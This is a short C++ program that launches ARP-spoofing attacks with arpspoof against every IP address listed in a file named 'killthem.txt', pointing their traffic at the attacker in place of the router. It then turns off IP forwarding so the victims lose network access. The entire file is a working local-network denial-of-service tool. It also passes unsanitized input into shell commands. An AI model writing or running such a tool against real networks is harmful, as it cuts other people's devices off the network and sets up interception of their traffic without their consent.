#include <stdlib.h>
#include <fstream>
#include <string>
using namespace std;
int main(int argc,char* argv[])
{
	string path = "killthem.txt";
	ifstream file(path.c_str());
    string paths;
	string router(argv[1]);
    while (getline(file, paths)) {
		string command = "sudo arpspoof -t "+paths+ " "+router+"& > /dev/null 2>&1";
        system(command.c_str());
    }
	string command2 = "echo 0 |sudo tee /proc/sys/net/ipv4/ip_forward";
	system(command2.c_str());
}
